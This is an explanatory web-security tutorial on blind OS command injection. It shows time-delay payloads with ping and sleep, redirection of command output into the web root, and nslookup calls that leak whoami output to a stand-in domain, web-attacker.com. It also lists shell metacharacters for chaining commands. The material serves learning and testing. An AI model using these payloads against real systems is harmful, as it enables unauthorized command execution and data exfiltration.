## Blind OS command injection vulnerabilities
Many instances of OS command injection are blind vulnerabilities. This means that the application does not return the output from the command within its HTTP response. Blind vulnerabilities can still be exploited, but different techniques are required.
### Detecting blind OS command injection using time delays
- The ping command is a good way to do this, because lets you specify the number of ICMP packets to send. This enables you to control the time taken for the command to run:
`& ping -c 10 127.0.0.1 &`
`& sleep 10 &`
`or # at the end instead of & to comment out the rest`
This command causes the application to ping its loopback network adapter for 10 seconds.
### Exploiting blind OS command injection by redirecting output
 You can redirect the output from the injected command into a file within the web root that you can then retrieve using the browser. For example, if the application serves static resources from the filesystem location /var/www/static, then you can submit the following input:
& whoami > /var/www/static/whoami.txt &
### Exploiting blind OS command injection using out-of-band (OAST) techniques
- You can use an injected command that will trigger an out-of-band network interaction with a system that you control, using OAST techniques. For example:
`& nslookup kgji2ohoyw.web-attacker.com &`
* This payload uses the nslookup command to cause a DNS lookup for the specified domain. The attacker can monitor to see if the lookup happens, to confirm if the command was successfully injected.

- The out-of-band channel provides an easy way to exfiltrate the output from injected commands:
```bash
& nslookup `whoami`.kgji2ohoyw.web-attacker.com &
& nslookup $(whoami).kgji2ohoyw.web-attacker.com &
```

This causes a DNS lookup to the attacker's domain containing the result of the whoami command:
wwwuser.kgji2ohoyw.web-attacker.com

### Ways of injecting OS commands
You can use a number of shell metacharacters to perform OS command injection attacks.

A number of characters function as command separators, allowing commands to be chained together. The following command separators work on both Windows and Unix-based systems:

    &
    &&
    |
    ||

The following command separators work only on Unix-based systems:

    ;
    Newline (0x0a or \n)

On Unix-based systems, you can also use backticks or the dollar character to perform inline execution of an injected command within the original command:

    ` injected command `
    $(injected command)

The different shell metacharacters have subtly different behaviors that might change whether they work in certain situations. This could impact whether they allow in-band retrieval of command output or are useful only for blind exploitation.

Sometimes, the input that you control appears within quotation marks in the original command. In this situation, you need to terminate the quoted context (using " or ') before using suitable shell metacharacters to inject a new command. 

# Read more
https://portswigger.net/research/hunting-asynchronous-vulnerabilities